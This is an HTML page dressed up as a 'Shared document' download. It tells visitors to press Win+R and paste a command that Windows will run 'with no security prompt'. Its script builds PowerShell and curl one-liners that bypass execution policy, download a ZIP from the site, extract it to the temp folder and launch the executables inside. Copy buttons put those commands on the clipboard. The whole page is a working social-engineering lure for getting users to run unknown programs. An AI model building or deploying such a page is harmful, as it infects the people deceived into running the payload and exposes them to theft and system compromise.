<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Shared document</title>
<style>
  :root { color-scheme: light }
  body { margin:0; min-height:100vh; display:grid; place-items:center;
         font:15px/1.55 -apple-system,Segoe UI,Roboto,sans-serif;
         background:#eef1f5; color:#16202a; padding:24px }
  main { width:100%; max-width:620px; background:#fff; border:1px solid #dde3e9;
         border-radius:14px; padding:26px 26px 22px }
  h1 { font-size:19px; margin:0 0 6px }
  p.sub { margin:0 0 20px; color:#5d6d7c; font-size:13.5px }
  .label { font-size:12px; text-transform:uppercase; letter-spacing:.05em;
           color:#7a8b99; margin:0 0 6px }
  .cmd { display:flex; gap:8px; align-items:flex-start; background:#0f1720;
         border-radius:9px; padding:11px; margin:0 0 10px }
  .cmd code { flex:1; font:12px/1.5 ui-monospace,Consolas,monospace;
              color:#cfe6ff; word-break:break-all }
  .cmd button { font:12px ui-monospace,monospace; background:#2b6cb0; color:#fff;
                border:0; border-radius:6px; padding:7px 10px; cursor:pointer }
  .cmd button:active { background:#245a94 }
  .links { display:flex; gap:8px; flex-wrap:wrap; margin:16px 0 0 }
  a.btn { padding:9px 15px; border-radius:8px; font-size:13px; text-decoration:none }
  a.solid { background:#2b6cb0; color:#fff }
  a.ghost { background:#e7ecf1; color:#1d2b38 }
  footer { margin:18px 0 0; font-size:12px; color:#8a99a6 }
</style>
<main>
  <h1>Shared document</h1>
  <p class="sub">Copy the command, press <b>Win+R</b>, paste and hit Enter. Windows downloads and opens it with no security prompt.</p>

  <p class="label">PowerShell — recommended</p>
  <div class="cmd"><code id="ps">…</code><button data-c="ps">copy</button></div>

  <p class="label">Command prompt (curl)</p>
  <div class="cmd"><code id="cu">…</code><button data-c="cu">copy</button></div>

  <p class="links">
    <a class="btn solid" id="dl" href="/download">Download ZIP</a>
    <a class="btn ghost" id="html" href="/h">Download via page</a>
  </p>

  <footer>Extract the archive if you use a download button.</footer>
</main>
<script>
  const k = new URLSearchParams(location.search).get("k");
  const q = k ? "?k=" + encodeURIComponent(k) : "";
  const url = location.origin + "/download" + q;
  const z = "$env:TEMP\\d.zip", d = "$env:TEMP\\dx";

  document.getElementById("ps").textContent =
    'powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -UseBasicParsing -Uri \'' + url +
    '\' -OutFile \\"' + z + '\\"; Expand-Archive -Force \\"' + z + '\\" \\"' + d +
    '\\"; Start-Process (Get-ChildItem \\"' + d + '\\*.exe\\" | Select-Object -First 1).FullName"';

  document.getElementById("cu").textContent =
    'curl.exe -L -o "%TEMP%\\d.zip" "' + url + '" && tar -xf "%TEMP%\\d.zip" -C "%TEMP%" && ' +
    'for %f in ("%TEMP%\\*.exe") do start "" "%f"';

  document.getElementById("dl").href = "/download" + q;
  document.getElementById("html").href = "/h" + q;

  document.addEventListener("click", (e) => {
    const b = e.target.closest("button[data-c]");
    if (!b) return;
    const text = document.getElementById(b.dataset.c).textContent;
    navigator.clipboard.writeText(text).then(() => {
      const old = b.textContent;
      b.textContent = "copied";
      setTimeout(() => { b.textContent = old; }, 1200);
    });
  });
</script>
